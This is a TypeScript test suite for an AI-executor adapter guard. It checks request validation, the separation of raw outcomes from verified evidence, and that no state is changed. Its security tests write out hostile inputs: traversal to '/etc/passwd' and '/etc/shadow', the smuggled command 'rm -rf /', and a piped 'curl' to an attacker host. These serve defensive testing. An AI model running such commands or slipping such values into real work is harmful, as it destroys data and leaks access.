/**
 * Phase 10 TASK-P10-03: Antigravity Executor Adapter Boundary Test Suite
 *
 * Verifies the strict boundaries, security, and contracts of the Antigravity Executor Adapter:
 * - Adapter accepts ONLY validated ExecutionRequest.
 * - Antigravity is ONLY an executor (never authoritative for project/task/evidence state).
 * - RawExecutorOutcome is separate from and cannot be confused with SystemVerifiedEvidence.
 * - ExecutorPort boundary and pluggability.
 * - Strict defense against path traversal, absolute paths, drive paths, UNC paths, and shell injection.
 * - Timeout and cancellation handling.
 * - Zero state mutation across DurableStateManager, TaskDagEngine, SpecStore, ApprovalStore.
 * - Zero autonomous retry loops.
 * - Request binding and requestId hash preservation.
 * - MCP tool boundary (aidm.executor.execute).
 */

import { describe, it, beforeEach, afterEach } from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';

import {
  type ExecutionRequest,
  type BuildExecutionRequestInput,
  ExecutionRequestBuilder,
  computeDeterministicRequestId,
  type ExecutorPort,
  type ExecutionRequestExecutorPort,
  AntigravityAdapter,
  type AntigravityTranslatedPayload,
  type RawExecutorOutcome,
  RawExecutorOutcomeZodSchema,
  assertNotVerifiedEvidence,
  ExecutorGuard,
  ExecutorPreconditionError,
  ExecutorSecurityViolationError,
  ExecutionRequestValidationError,
  DurableStateManager,
  SpecStore,
  HistoryManager,
  ApprovalStore,
  ApprovalPackageEngine,
  HumanApprovalEngine,
  DirectorSessionStore,
  DirectorSessionEngine,
  DirectorDecisionStore,
  DirectorContextSynchronizer,
  ExecutionAuthorizer,
  TaskDagEngine,
  DefaultMcpOrchestratorDelegate,
  FakeGitPort,
  TaskStatus,
  TaskPriority,
  RiskLevel,
  LifecycleState,
  ContextEngine,
  InitialProjectUnderstandingBuilder,
  type DirectorSession,
  type DirectorDecision,
  type DirectorContextSnapshot,
  type ProjectApprovalPackage,
  type ProjectDiscoveryReport,
  type ExecutionIntent,
  McpServer,
  InMemoryMcpTransport,
  type McpOrchestratorDelegate,
  AIDM_EXECUTOR_EXECUTE_TOOL_NAME,
} from '../dist/index.js';

describe('Phase 10 TASK-P10-03: Antigravity Executor Adapter Boundary', () => {
  let tempDir: string;
  let fakeGitPort: FakeGitPort;
  let durableManager: DurableStateManager;
  let specStore: SpecStore;
  let historyManager: HistoryManager;
  let approvalStore: ApprovalStore;
  let approvalPackageEngine: ApprovalPackageEngine;
  let humanApprovalEngine: HumanApprovalEngine;
  let sessionStore: DirectorSessionStore;
  let sessionEngine: DirectorSessionEngine;
  let decisionStore: DirectorDecisionStore;
  let synchronizer: DirectorContextSynchronizer;
  let contextEngine: ContextEngine;
  let delegate: DefaultMcpOrchestratorDelegate;
  let authorizer: ExecutionAuthorizer;
  let requestBuilder: ExecutionRequestBuilder;
  let adapter: AntigravityAdapter;

  let activeSession: DirectorSession;
  let activeSnapshot: DirectorContextSnapshot;
  let testPackage: ProjectApprovalPackage;
  let testDecision: DirectorDecision;
  let sampleIntent: ExecutionIntent;
  let sampleRequest: ExecutionRequest;

  const validBaseCommit = 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2';

  function createMockReport(workspaceRoot: string): ProjectDiscoveryReport {
    return {
      projectIdentity: {
        name: 'test-exec-project',
        version: '1.0.0',
        workspaceRoot,
        ecosystem: 'Node.js',
        evidence: [{ sourceType: 'PACKAGE_MANIFEST', sourceIdentifier: 'package.json' }],
      },
      purpose: {
        classification: 'UNDERSTOOD',
        summary: 'A deterministic agent orchestration platform',
        domainKeywords: ['orchestration', 'agent'],
        evidence: [{ sourceType: 'FILE', sourceIdentifier: 'README.md' }],
      },
      technologyStack: {
        primaryLanguages: ['TypeScript'],
        frameworks: [],
        buildTools: ['tsc'],
        packageManagers: ['npm'],
        runtimes: ['node'],
        containerization: [],
        ciCd: [],
        workspaceType: 'standalone',
      },
      architecture: {
        summary: 'Standard modular TypeScript architecture',
        architecturalPattern: 'Modular',
        identifiedAreas: [],
        evidence: [{ sourceType: 'FILE', sourceIdentifier: 'src/index.ts' }],
      },
      currentImplementationState: {
        lifecycleState: 'REQUIREMENTS_INGESTION',
        hasActiveTask: false,
        isBlocked: false,
        totalTasksInDag: 0,
        completedTasksCount: 0,
        evidence: [{ sourceType: 'STATE_MANAGER', sourceIdentifier: 'durable-state.json' }],
      },
      unknowns: [],
      contradictions: [],
      evidenceInventory: [],
      generatedAt: new Date().toISOString(),
    };
  }

  async function createReadyTasks() {
    await specStore.saveTasks([
      {
        task_id: 'FEAT-ROOT-001',
        parent_feature_id: 'ROOT',
        title: 'Feature Root',
        description: 'Root feature',
        traceability_sources: ['REQ-001'],
        dependencies: [],
        acceptance_criteria: ['AC-ROOT'],
        status: TaskStatus.READY,
        attempt: 1,
        max_attempts: 3,
        priority: TaskPriority.HIGH,
        risk_level: RiskLevel.SAFE,
        hierarchy_level: 'FEATURE' as any,
        created_at: new Date().toISOString(),
        started_at: null,
        completed_at: null,
        metadata: { revision: 1 },
      },
      {
        task_id: 'TASK-P10-01',
        parent_feature_id: 'FEAT-ROOT-001',
        title: 'Phase 10 Execution Task',
        description: 'Authoritative description from SpecStore Task DAG',
        traceability_sources: ['REQ-001'],
        dependencies: [],
        acceptance_criteria: ['Adapter boundary established', 'Security invariants enforced'],
        status: TaskStatus.READY,
        attempt: 1,
        max_attempts: 3,
        priority: TaskPriority.HIGH,
        risk_level: RiskLevel.SAFE,
        created_at: new Date().toISOString(),
        started_at: null,
        completed_at: null,
        metadata: { revision: 2 },
      },
    ]);
  }

  beforeEach(async () => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aidm-p10-03-test-'));

    // Create minimal project file
    fs.writeFileSync(
      path.join(tempDir, 'package.json'),
      JSON.stringify({ name: 'test-exec-project', version: '1.0.0' }, null, 2)
    );

    fakeGitPort = new FakeGitPort({
      initialState: {
        head_sha: validBaseCommit,
        current_branch: 'main',
        working_tree_clean: true,
        staged_changes: [],
        unstaged_changes: [],
        untracked_files: [],
      },
    });

    historyManager = new HistoryManager({ baseDir: tempDir });
    sessionStore = new DirectorSessionStore({ baseDir: tempDir, historyManager });
    sessionEngine = new DirectorSessionEngine({ store: sessionStore, workspaceRoot: tempDir });
    decisionStore = new DirectorDecisionStore({ sessionStore, historyManager });
    approvalStore = new ApprovalStore({ baseDir: tempDir, historyManager });
    approvalPackageEngine = new ApprovalPackageEngine();
    durableManager = new DurableStateManager({ baseDir: tempDir });
    specStore = new SpecStore({ baseDir: tempDir });
    contextEngine = new ContextEngine({ workspaceRoot: tempDir });

    delegate = new DefaultMcpOrchestratorDelegate({
      projectRoot: tempDir,
      durableStateManager: durableManager,
      specStore,
      historyManager,
      approvalStore,
      contextEngine,
      gitPort: fakeGitPort,
      directorSessionStore: sessionStore,
      directorDecisionStore: decisionStore,
    });

    synchronizer = new DirectorContextSynchronizer({
      workspaceRoot: tempDir,
      delegate,
      sessionEngine,
      sessionStore,
    });

    humanApprovalEngine = new HumanApprovalEngine({
      workspaceRoot: tempDir,
      delegate,
      approvalStore,
      approvalPackageEngine,
      sessionStore,
      sessionEngine,
      decisionStore,
      historyManager,
    });

    authorizer = new ExecutionAuthorizer({
      workspaceRoot: tempDir,
      delegate,
      sessionStore,
      sessionEngine,
      decisionStore,
      approvalStore,
      approvalPackageEngine,
      specStore,
      dagEngine: new TaskDagEngine(),
      historyManager,
    });

    requestBuilder = new ExecutionRequestBuilder({
      workspaceRoot: tempDir,
      gitPort: fakeGitPort,
      specStore,
      authorizer,
      delegate,
    });

    // 1. Create active Director session
    activeSession = await sessionEngine.createSession({
      workspaceRoot: tempDir,
      directorSessionId: 'dir-sess-p10-03-001',
      understandingRevision: 5,
    });

    // 2. Synchronize context snapshot
    activeSnapshot = await synchronizer.synchronize({
      directorSessionId: activeSession.directorSessionId,
      workspaceRoot: tempDir,
    });

    // 3. Build & approve package with explicit Product Owner approval
    const report = createMockReport(tempDir);
    const understandingBuilder = new InitialProjectUnderstandingBuilder();
    const understanding = understandingBuilder.build(report, undefined, { projectId: 'test-exec-project' });
    testPackage = approvalPackageEngine.buildPackage(understanding, undefined, {
      packageId: 'pkg-p10-03-001',
    });
    await approvalStore.savePackage(testPackage);

    const approvalResult = await humanApprovalEngine.submitApproval({
      workspaceRoot: tempDir,
      projectId: 'test-exec-project',
      directorSessionId: activeSession.directorSessionId,
      packageId: testPackage.packageId,
      revision: testPackage.revision,
      contextFingerprint: activeSnapshot.logicalFingerprint,
      understandingRevision: 5,
      actor: 'alice-po',
      actorRole: 'PRODUCT_OWNER',
      intent: 'EXPLICIT_APPROVAL',
      comment: 'Approved for execution testing',
    });
    assert.equal(approvalResult.isDevelopmentAuthorized, true);
    testPackage = approvalResult.package;

    // 4. Create READY task
    await createReadyTasks();

    // 5. Create IMPLEMENT_TASK decision
    testDecision = {
      decisionId: `dec-impl-${Date.now()}`,
      directorSessionId: activeSession.directorSessionId,
      projectId: 'test-exec-project',
      protocolVersion: 'P9-03',
      schemaVersion: 1,
      actor: 'DIRECTOR' as const,
      decisionType: 'IMPLEMENT_TASK',
      rationale: 'Implement task TASK-P10-01',
      basedOnContextFingerprint: activeSnapshot.logicalFingerprint,
      basedOnApprovalRevision: testPackage.revision,
      basedOnUnderstandingRevision: 5,
      createdAt: new Date().toISOString(),
      metadata: {},
      hasImplementationAuthority: false as const,
    };
    await decisionStore.saveDecision(testDecision);

    // 6. Formulate verified sampleIntent
    const authResult = await authorizer.validateExecutionIntent({
      workspaceRoot: tempDir,
      projectId: 'test-exec-project',
      directorSessionId: activeSession.directorSessionId,
      directorDecisionId: testDecision.decisionId,
      taskId: 'TASK-P10-01',
      taskRevision: 2,
      contextFingerprint: activeSnapshot.logicalFingerprint,
      understandingRevision: 5,
      approvalPackageRevision: testPackage.revision,
      operationType: 'IMPLEMENT_TASK',
    });
    assert.equal(authResult.isValid, true);
    assert.ok(authResult.intent);
    sampleIntent = authResult.intent;

    // 7. Build deterministic ExecutionRequest
    sampleRequest = await requestBuilder.buildExecutionRequest({
      intent: sampleIntent,
      instruction: {
        objective: 'Implement adapter boundary for Antigravity executor',
        constraints: ['Strict path checks', 'No shell injection'],
        targetFiles: ['src/adapter.ts', 'src/guard.ts'],
        acceptanceCriteria: ['Passes all safety checks', 'Returns typed raw outcome'],
      },
      executionLimits: {
        timeoutMs: 15_000,
        maxFileModifications: 10,
      },
    });

    adapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      binaryPath: 'agy',
      version: '1.2.8',
    });
  });

  afterEach(() => {
    try {
      if (tempDir && fs.existsSync(tempDir)) {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    } catch {
      // Ignore cleanup error
    }
  });

  // ==========================================================================
  // 1. CORE DISPATCH & BINDING FIDELITY (T01–T03, T19)
  // ==========================================================================

  it('T01: Valid ExecutionRequest reaches ExecutorPort', async () => {
    let capturedRequest: ExecutionRequest | null = null;

    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async (_payload, req) => {
        capturedRequest = req;
        return {
          exitCode: 0,
          stdout: 'Execution successful',
          unverifiedAgentClaims: ['Task completed'],
          unverifiedModifiedFiles: [...req.instruction.targetFiles],
        };
      },
    });

    const outcome = await mockAdapter.execute(sampleRequest);

    assert.ok(capturedRequest);
    assert.strictEqual(outcome.status, 'SUCCESS');
    assert.strictEqual(outcome.exitCode, 0);
  });

  it('T02: ExecutorPort receives the exact requestId', async () => {
    let capturedRequestId: string | null = null;

    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async (_payload, req) => {
        capturedRequestId = req.requestId;
        return { exitCode: 0, stdout: 'ok' };
      },
    });

    const outcome = await mockAdapter.execute(sampleRequest);

    assert.strictEqual(capturedRequestId, sampleRequest.requestId);
    assert.strictEqual(outcome.requestId, sampleRequest.requestId);
    assert.strictEqual(outcome.requestBinding.requestId, sampleRequest.requestId);
  });

  it('T03: ExecutorPort receives the exact taskId and taskRevision', async () => {
    let capturedTaskId: string | null = null;
    let capturedTaskRevision: number | null = null;

    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async (_payload, req) => {
        capturedTaskId = req.taskId;
        capturedTaskRevision = req.taskRevision;
        return { exitCode: 0, stdout: 'ok' };
      },
    });

    const outcome = await mockAdapter.execute(sampleRequest);

    assert.strictEqual(capturedTaskId, 'TASK-P10-01');
    assert.strictEqual(capturedTaskRevision, 2);
    assert.strictEqual(outcome.requestBinding.taskId, 'TASK-P10-01');
    assert.strictEqual(outcome.requestBinding.taskRevision, 2);
    assert.strictEqual(outcome.requestBinding.contextFingerprint, sampleRequest.contextFingerprint);
    assert.strictEqual(outcome.requestBinding.understandingRevision, sampleRequest.understandingRevision);
    assert.strictEqual(outcome.requestBinding.approvalPackageRevision, sampleRequest.approvalPackageRevision);
  });

  it('T19: Same ExecutionRequest preserves same requestId across repeated invocations', async () => {
    const outcomeA = await adapter.execute(sampleRequest);
    const outcomeB = await adapter.execute(sampleRequest);

    assert.strictEqual(outcomeA.requestId, sampleRequest.requestId);
    assert.strictEqual(outcomeB.requestId, sampleRequest.requestId);
    assert.strictEqual(outcomeA.requestId, outcomeB.requestId);
  });

  // ==========================================================================
  // 2. PRECONDITION VALIDATION & REJECTIONS (T04, T05, T27)
  // ==========================================================================

  it('T04: Invalid request is rejected before executor invocation', async () => {
    let invokerCalled = false;
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => {
        invokerCalled = true;
        return { exitCode: 0 };
      },
    });

    // Null request
    await assert.rejects(
      async () => mockAdapter.execute(null as any),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorPreconditionError);
        return true;
      }
    );

    // Malformed request (missing required fields)
    await assert.rejects(
      async () => mockAdapter.execute({ requestId: 'req-bad' } as any),
      (err: unknown) => {
        assert.ok(err instanceof ExecutionRequestValidationError);
        return true;
      }
    );

    assert.strictEqual(invokerCalled, false);
  });

  it('T05: Forged/unsupported operation type is rejected', async () => {
    let invokerCalled = false;
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => {
        invokerCalled = true;
        return { exitCode: 0 };
      },
    });

    const forgedOpRequest = {
      ...sampleRequest,
      operationType: 'FORMAT_DISK' as any,
    };

    await assert.rejects(
      async () => mockAdapter.execute(forgedOpRequest),
      (err: unknown) => {
        assert.ok(err instanceof ExecutionRequestValidationError || err instanceof ExecutorSecurityViolationError);
        return true;
      }
    );

    assert.strictEqual(invokerCalled, false);
  });

  it('T27: Tampered requestId hash is detected and rejected by ExecutorGuard', async () => {
    let invokerCalled = false;
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => {
        invokerCalled = true;
        return { exitCode: 0 };
      },
    });

    // Valid format req-..., but hash does not match content
    const tamperedRequest: ExecutionRequest = {
      ...sampleRequest,
      requestId: 'req-00000000000000000000000000000000',
    };

    await assert.rejects(
      async () => mockAdapter.execute(tamperedRequest),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorPreconditionError);
        assert.match(err.message, /requestId hash mismatch/);
        return true;
      }
    );

    assert.strictEqual(invokerCalled, false);
  });

  // ==========================================================================
  // 3. SECURITY: PATH SAFETY & SHELL INJECTION DEFENSE (T06–T08, T26)
  // ==========================================================================

  it('T06: Path traversal sequence (..) in targetFiles is strictly rejected', async () => {
    let invokerCalled = false;
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => {
        invokerCalled = true;
        return { exitCode: 0 };
      },
    });

    const traversalRequest: ExecutionRequest = {
      ...sampleRequest,
      instruction: {
        ...sampleRequest.instruction,
        targetFiles: ['src/valid.ts', '../../etc/passwd'],
      },
    };

    await assert.rejects(
      async () => mockAdapter.execute(traversalRequest),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorSecurityViolationError);
        assert.match(err.message, /Path traversal sequence/);
        return true;
      }
    );

    assert.strictEqual(invokerCalled, false);
  });

  it('T07: Absolute path in targetFiles is strictly rejected', async () => {
    let invokerCalled = false;
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => {
        invokerCalled = true;
        return { exitCode: 0 };
      },
    });

    const absolutePathRequest: ExecutionRequest = {
      ...sampleRequest,
      instruction: {
        ...sampleRequest.instruction,
        targetFiles: ['/etc/shadow', 'src/safe.ts'],
      },
    };

    await assert.rejects(
      async () => mockAdapter.execute(absolutePathRequest),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorSecurityViolationError);
        assert.match(err.message, /Absolute path rejected/);
        return true;
      }
    );

    assert.strictEqual(invokerCalled, false);
  });

  it('T26: Windows drive paths and UNC network paths are strictly rejected', async () => {
    let invokerCalled = false;
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => {
        invokerCalled = true;
        return { exitCode: 0 };
      },
    });

    // Windows drive path
    const drivePathRequest: ExecutionRequest = {
      ...sampleRequest,
      instruction: {
        ...sampleRequest.instruction,
        targetFiles: ['C:\\Windows\\System32\\cmd.exe'],
      },
    };

    await assert.rejects(
      async () => mockAdapter.execute(drivePathRequest),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorSecurityViolationError);
        assert.match(err.message, /Windows drive path rejected/);
        return true;
      }
    );

    // UNC path
    const uncPathRequest: ExecutionRequest = {
      ...sampleRequest,
      instruction: {
        ...sampleRequest.instruction,
        targetFiles: ['\\\\internal-server\\share\\secret.key'],
      },
    };

    await assert.rejects(
      async () => mockAdapter.execute(uncPathRequest),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorSecurityViolationError);
        assert.match(err.message, /UNC path rejected/);
        return true;
      }
    );

    assert.strictEqual(invokerCalled, false);
  });

  it('T08: Shell injection attempt cannot become arbitrary execution', async () => {
    let invokerCalled = false;
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => {
        invokerCalled = true;
        return { exitCode: 0 };
      },
    });

    // Semicolon injection in taskId
    const injectionRequest: ExecutionRequest = {
      ...sampleRequest,
      taskId: 'TASK-01; rm -rf /',
    };

    await assert.rejects(
      async () => mockAdapter.execute(injectionRequest),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorSecurityViolationError);
        assert.match(err.message, /Shell injection/);
        return true;
      }
    );

    // Pipe / backtick in targetFiles
    const fileInjectionRequest: ExecutionRequest = {
      ...sampleRequest,
      instruction: {
        ...sampleRequest.instruction,
        targetFiles: ['foo.ts | curl http://attacker.com'],
      },
    };

    await assert.rejects(
      async () => mockAdapter.execute(fileInjectionRequest),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorSecurityViolationError);
        assert.match(err.message, /Shell metacharacter/);
        return true;
      }
    );

    assert.strictEqual(invokerCalled, false);
  });

  // ==========================================================================
  // 4. OUTCOME MAPPING & STATUS (T09–T11)
  // ==========================================================================

  it('T09: Executor failure becomes RawExecutorOutcome failure with preserved error info', async () => {
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => ({
        exitCode: 1,
        stdout: 'Compiler crashed',
        stderr: 'TypeScript compile error TS2304: Cannot find name foo',
        agent_claims: ['Failed to build'],
      }),
    });

    const outcome = await mockAdapter.execute(sampleRequest);

    assert.strictEqual(outcome.status, 'FAILURE');
    assert.strictEqual(outcome.exitCode, 1);
    assert.strictEqual(outcome.timedOut, false);
    assert.strictEqual(outcome.cancelled, false);
    assert.strictEqual(outcome.stderr, 'TypeScript compile error TS2304: Cannot find name foo');
    assert.deepStrictEqual(outcome.unverifiedAgentClaims, ['Failed to build']);
    assert.ok(outcome.error);
    assert.strictEqual(outcome.error.code, 'ERR_EXECUTOR_FAILED');
  });

  it('T10: Executor timeout becomes RawExecutorOutcome timeout', async () => {
    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async (_payload, _req, context) => {
        // Wait longer than timeout
        await new Promise((resolve) => setTimeout(resolve, context.timeoutMs + 50));
        return { exitCode: 0 };
      },
    });

    const shortTimeoutRequest: ExecutionRequest = await requestBuilder.buildExecutionRequest({
      intent: sampleIntent,
      instruction: {
        objective: 'Implement adapter boundary for Antigravity executor',
        constraints: ['Strict path checks', 'No shell injection'],
        targetFiles: ['src/adapter.ts', 'src/guard.ts'],
        acceptanceCriteria: ['Passes all safety checks', 'Returns typed raw outcome'],
      },
      executionLimits: {
        timeoutMs: 1_000, // 1 sec
        maxFileModifications: 5,
      },
    });

    const outcome = await mockAdapter.execute(shortTimeoutRequest);

    assert.strictEqual(outcome.status, 'TIMEOUT');
    assert.strictEqual(outcome.timedOut, true);
    assert.strictEqual(outcome.cancelled, false);
    assert.strictEqual(outcome.exitCode, null);
    assert.strictEqual(outcome.signal, 'SIGKILL');
    assert.ok(outcome.error);
    assert.strictEqual(outcome.error.code, 'ERR_EXECUTOR_TIMEOUT');
  });

  it('T11: Executor cancellation becomes RawExecutorOutcome cancelled', async () => {
    const abortController = new AbortController();

    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async (_payload, _req, context) => {
        // Simulate waiting for abort
        return new Promise((_resolve, reject) => {
          context.signal?.addEventListener('abort', () => {
            reject(new Error('Caller aborted execution'));
          });
        });
      },
    });

    // Abort after 50ms
    setTimeout(() => {
      abortController.abort();
    }, 50);

    const outcome = await mockAdapter.execute(sampleRequest, {
      signal: abortController.signal,
    });

    assert.strictEqual(outcome.status, 'CANCELLED');
    assert.strictEqual(outcome.cancelled, true);
    assert.strictEqual(outcome.timedOut, false);
    assert.strictEqual(outcome.exitCode, null);
    assert.strictEqual(outcome.signal, 'SIGTERM');
    assert.ok(outcome.error);
    assert.strictEqual(outcome.error.code, 'ERR_EXECUTOR_CANCELLED');
  });

  // ==========================================================================
  // 5. ARCHITECTURAL INVARIANTS: ZERO MUTATION & NO RETRY (T12–T18)
  // ==========================================================================

  it('T12: Executor success does NOT automatically create SystemVerifiedEvidence', async () => {
    const outcome = await adapter.execute(sampleRequest);

    assert.strictEqual(outcome.status, 'SUCCESS');

    // No evidence files should be created in state directory
    const stateDir = path.join(tempDir, '.ai-manager');
    const files = fs.existsSync(stateDir) ? fs.readdirSync(stateDir) : [];
    assert.strictEqual(files.includes('evidence.jsonl'), false);
    assert.strictEqual(files.includes('system-evidence.json'), false);
  });

  it('T13: Executor success does NOT mark task ACCEPTED', async () => {
    await adapter.execute(sampleRequest);

    const tasks = await specStore.loadTasks();
    const task = tasks.find((t) => t.task_id === 'TASK-P10-01');

    assert.ok(task);
    assert.notStrictEqual(task.status, TaskStatus.ACCEPTED);
    assert.strictEqual(task.status, TaskStatus.READY);
  });

  it('T14: Executor success does NOT mutate DurableStateManager global FSM', async () => {
    const durableBefore = await durableManager.load();

    await adapter.execute(sampleRequest);

    const durableAfter = await durableManager.load();
    assert.deepStrictEqual(durableAfter, durableBefore);
  });

  it('T15: Executor success does NOT mutate TaskDagEngine graph', async () => {
    const tasksBefore = await specStore.loadTasks();

    await adapter.execute(sampleRequest);

    const tasksAfter = await specStore.loadTasks();
    assert.deepStrictEqual(tasksAfter, tasksBefore);
  });

  it('T16: Executor success does NOT mutate SpecStore requirements or decisions', async () => {
    const decisionsBefore = await specStore.loadDecisions();
    const reqsBefore = await specStore.loadRequirements();

    await adapter.execute(sampleRequest);

    const decisionsAfter = await specStore.loadDecisions();
    const reqsAfter = await specStore.loadRequirements();

    assert.deepStrictEqual(decisionsAfter, decisionsBefore);
    assert.deepStrictEqual(reqsAfter, reqsBefore);
  });

  it('T17: Executor success does NOT mutate ApprovalStore package status', async () => {
    const pkgBefore = await approvalStore.loadPackage(testPackage.packageId);

    await adapter.execute(sampleRequest);

    const pkgAfter = await approvalStore.loadPackage(testPackage.packageId);
    assert.deepStrictEqual(pkgAfter, pkgBefore);
  });

  it('T18: No autonomous retry loop: single failure returns immediately without re-invoking executor', async () => {
    let invokeCount = 0;

    const mockAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async () => {
        invokeCount++;
        return { exitCode: 1, stderr: 'First attempt failure' };
      },
    });

    const outcome = await mockAdapter.execute(sampleRequest);

    assert.strictEqual(invokeCount, 1, 'Executor must be invoked exactly once; no auto-retry in P10-03');
    assert.strictEqual(outcome.status, 'FAILURE');
  });

  // ==========================================================================
  // 6. TESTING & PLUGGABILITY CONTRACTS (T20, T21)
  // ==========================================================================

  it('T20: Fake executor can be injected for deterministic tests', async () => {
    class FakeExecutorPort implements ExecutionRequestExecutorPort {
      readonly executorId = 'executor:fake';
      readonly provider = 'fake-provider';

      async execute(request: ExecutionRequest): Promise<RawExecutorOutcome> {
        return {
          requestId: request.requestId,
          executorIdentity: { provider: this.provider, name: this.executorId, version: '1.0.0' },
          status: 'SUCCESS',
          exitCode: 0,
          signal: null,
          stdout: 'Fake output',
          stderr: null,
          startedAt: new Date().toISOString(),
          completedAt: new Date().toISOString(),
          durationMs: 42,
          timedOut: false,
          cancelled: false,
          requestBinding: {
            requestId: request.requestId,
            projectId: request.projectId,
            taskId: request.taskId,
            taskRevision: request.taskRevision,
            contextFingerprint: request.contextFingerprint,
            understandingRevision: request.understandingRevision,
            approvalPackageRevision: request.approvalPackageRevision,
          },
          unverifiedAgentClaims: ['Fake claim'],
          unverifiedModifiedFiles: ['fake.ts'],
        };
      }
    }

    const fakePort: ExecutorPort = new FakeExecutorPort();
    const outcome = await fakePort.execute(sampleRequest);

    assert.strictEqual(outcome.status, 'SUCCESS');
    assert.strictEqual(outcome.durationMs, 42);
    assert.strictEqual(outcome.executorIdentity.provider, 'fake-provider');
  });

  it('T21: Antigravity adapter can be tested without launching the real executor', async () => {
    let payloadCaptured: AntigravityTranslatedPayload | null = null;

    const simulatedAdapter = new AntigravityAdapter({
      workspaceRoot: tempDir,
      requestInvoker: async (payload) => {
        payloadCaptured = payload;
        return {
          exitCode: 0,
          stdout: 'Simulated CLI response',
          agent_claims: ['Generated files safely'],
          unverified_changed_files: ['src/adapter.ts'],
        };
      },
    });

    const outcome = await simulatedAdapter.execute(sampleRequest);

    assert.ok(payloadCaptured);
    assert.ok((payloadCaptured as AntigravityTranslatedPayload).structuredPrompt.includes('=== AIDM AUTHORIZED EXECUTION REQUEST ==='));
    assert.ok((payloadCaptured as AntigravityTranslatedPayload).structuredPrompt.includes('Task ID: TASK-P10-01'));
    assert.ok((payloadCaptured as AntigravityTranslatedPayload).args.includes('--print'));
    assert.strictEqual(outcome.status, 'SUCCESS');
  });

  // ==========================================================================
  // 7. RAW OUTCOME VS VERIFIED EVIDENCE SEPARATION (T22)
  // ==========================================================================

  it('T22: Raw executor outcome cannot be confused with verified evidence', () => {
    const validRawOutcome: RawExecutorOutcome = {
      requestId: sampleRequest.requestId,
      executorIdentity: { provider: 'antigravity', name: 'executor:antigravity', version: '1.2.8' },
      status: 'SUCCESS',
      exitCode: 0,
      signal: null,
      stdout: 'All done',
      stderr: null,
      startedAt: new Date().toISOString(),
      completedAt: new Date().toISOString(),
      durationMs: 100,
      timedOut: false,
      cancelled: false,
      requestBinding: {
        requestId: sampleRequest.requestId,
        projectId: sampleRequest.projectId,
        taskId: sampleRequest.taskId,
        taskRevision: sampleRequest.taskRevision,
        contextFingerprint: sampleRequest.contextFingerprint,
        understandingRevision: sampleRequest.understandingRevision,
        approvalPackageRevision: sampleRequest.approvalPackageRevision,
      },
      unverifiedAgentClaims: ['Tests pass', 'Task completed'],
      unverifiedModifiedFiles: ['src/foo.ts'],
    };

    // Valid raw outcome passes Zod validation
    const parsed = RawExecutorOutcomeZodSchema.safeParse(validRawOutcome);
    assert.strictEqual(parsed.success, true);

    // Any attempt to include system verification fields MUST fail Zod validation and assertion
    const deceptiveOutcome = {
      ...validRawOutcome,
      verified: true, // Forbidden verification claim
    };

    const parseDeceptive = RawExecutorOutcomeZodSchema.safeParse(deceptiveOutcome);
    assert.strictEqual(parseDeceptive.success, false);

    assert.throws(
      () => assertNotVerifiedEvidence(deceptiveOutcome),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorSecurityViolationError);
        assert.match(err.message, /forbidden system verification field/);
        return true;
      }
    );

    // Another forbidden field: qaPassed
    assert.throws(
      () => assertNotVerifiedEvidence({ ...validRawOutcome, qaPassed: true }),
      (err: unknown) => {
        assert.ok(err instanceof ExecutorSecurityViolationError);
        return true;
      }
    );
  });

  // ==========================================================================
  // 8. MCP TOOL BOUNDARY (T23–T25)
  // ==========================================================================

  it('T23: MCP tool aidm.executor.execute dispatches valid request and returns raw outcome without mutating state', async () => {
    const transport = new InMemoryMcpTransport();
    const delegate: McpOrchestratorDelegate = {
      isHealthy: () => true,
      projectRoot: tempDir,
      executorPort: adapter,
      durableStateManager: durableManager,
      specStore,
      approvalStore,
    };

    const server = new McpServer({
      transport,
      executorTools: true,
      delegate,
    });

    await server.start();
    const tool = server.getTool(AIDM_EXECUTOR_EXECUTE_TOOL_NAME);
    assert.ok(tool);

    const durableBefore = await durableManager.load();
    const tasksBefore = await specStore.loadTasks();

    const response = await tool.handler(
      { request: sampleRequest },
      {
        correlation: { correlationId: 'corr-p10-03', requestId: 'req-mcp-01', receivedAt: new Date().toISOString() },
        delegate,
      }
    );

    assert.ok(!response.isError);
    const parsed = JSON.parse(response.content[0].text as string);
    assert.strictEqual(parsed.success, true);
    assert.strictEqual(parsed.status, 'SUCCESS');
    assert.strictEqual(parsed.outcome.requestId, sampleRequest.requestId);

    // Verify zero state mutation via MCP
    const durableAfter = await durableManager.load();
    const tasksAfter = await specStore.loadTasks();
    assert.deepStrictEqual(durableAfter, durableBefore);
    assert.deepStrictEqual(tasksAfter, tasksBefore);

    await server.stop();
  });

